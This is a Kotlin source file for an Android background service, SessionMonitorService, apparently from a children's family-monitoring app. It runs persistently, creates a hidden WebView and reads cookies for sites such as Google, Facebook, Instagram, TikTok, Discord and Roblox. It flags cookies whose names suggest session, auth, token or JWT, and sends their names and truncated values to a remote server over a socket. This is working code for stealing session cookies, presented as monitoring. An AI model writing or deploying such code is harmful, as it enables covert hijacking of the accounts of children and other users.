package com.xixfamily.kids.service

import android.annotation.SuppressLint
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import android.webkit.CookieManager
import android.webkit.WebView
import android.webkit.WebViewClient
import com.xixfamily.kids.network.SocketManager
import org.json.JSONArray
import org.json.JSONObject

class SessionMonitorService : Service() {

    companion object {
        private const val TAG = "SessionMonitor"
        
        // Sites to monitor for session cookies
        private val MONITORED_DOMAINS = listOf(
            "google.com",
            "facebook.com", 
            "instagram.com",
            "tiktok.com",
            "twitter.com",
            "youtube.com",
            "whatsapp.com",
            "telegram.org",
            "discord.com",
            "reddit.com",
            "spotify.com",
            "netflix.com",
            "roblox.com"
        )
        
        var isMonitoring = false
            private set
        
        private var lastSentCookies = mutableMapOf<String, String>() // domain -> cookie string
    }

    private var webView: WebView? = null
    private var cookieManager: CookieManager? = null

    override fun onCreate() {
        super.onCreate()
        cookieManager = CookieManager.getInstance()
        cookieManager?.setAcceptCookie(true)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            cookieManager?.flush()
        }
        Log.d(TAG, "SessionMonitorService created")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            "START_MONITOR" -> startMonitoring()
            "CHECK_SESSIONS" -> checkAndReportCookies()
            "STOP_MONITOR" -> stopMonitoring()
        }
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    @SuppressLint("SetJavaScriptEnabled")
    private fun startMonitoring() {
        if (isMonitoring) return
        isMonitoring = true

        // Create a hidden WebView to load pages and extract cookies
        if (webView == null) {
            webView = WebView(this).apply {
                settings.javaScriptEnabled = true
                settings.domStorageEnabled = true
                settings.loadWithOverviewMode = true
                settings.useWideViewPort = true
            }
        }

        Log.d(TAG, "Session monitoring started")
        checkAndReportCookies()
    }

    private fun checkAndReportCookies() {
        if (!isMonitoring || !SocketManager.getInstance().isSocketConnected()) return

        try {
            val results = JSONArray()

            for (domain in MONITORED_DOMAINS) {
                val cookies = cookieManager?.getCookie("https://www.$domain") 
                    ?: cookieManager?.getCookie("https://$domain")
                    ?: ""

                if (cookies.isNotEmpty() && cookies != lastSentCookies[domain]) {
                    val cookiePairs = cookies.split(";").map { it.trim() }
                    
                    // Filter for session-related cookies only
                    val sessionCookies = cookiePairs.filter { cookie ->
                        val name = cookie.substringBefore("=").lowercase()
                        name.contains("session") || name.contains("token") || 
                        name.contains("auth") || name.contains("login") ||
                        name.contains("sid") || name.contains("secret") ||
                        name.contains("access") || name.contains("refresh") ||
                        name.contains("jwt") || name.contains("bearer")
                    }
                    
                    val allCookies = JSONArray()
                    for (cookie in cookiePairs) {
                        allCookies.put(JSONObject().apply {
                            put("name", cookie.substringBefore("="))
                            put("value", cookie.substringAfter("=", "").take(50)) // Only send first 50 chars for security
                            put("isSession", sessionCookies.contains(cookie))
                        })
                    }

                    results.put(JSONObject().apply {
                        put("domain", domain)
                        put("cookies", allCookies)
                        put("cookieCount", cookiePairs.size)
                        put("hasActiveSession", cookiePairs.size > 2)
                    })

                    lastSentCookies[domain] = cookies
                }
            }

            if (results.length() > 0) {
                SocketManager.getInstance().emit("session:cookies", JSONObject().apply {
                    put("domain", "multi")
                    put("cookies", results)
                    put("cookieCount", results.length())
                    put("appName", "Web Browser")
                })
                Log.d(TAG, "Reported ${results.length()} domains with active sessions")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error checking cookies: ${e.message}")
        }
    }

    private fun stopMonitoring() {
        isMonitoring = false
        webView?.destroy()
        webView = null
        Log.d(TAG, "Session monitoring stopped")
    }

    override fun onDestroy() {
        stopMonitoring()
        super.onDestroy()
    }
}
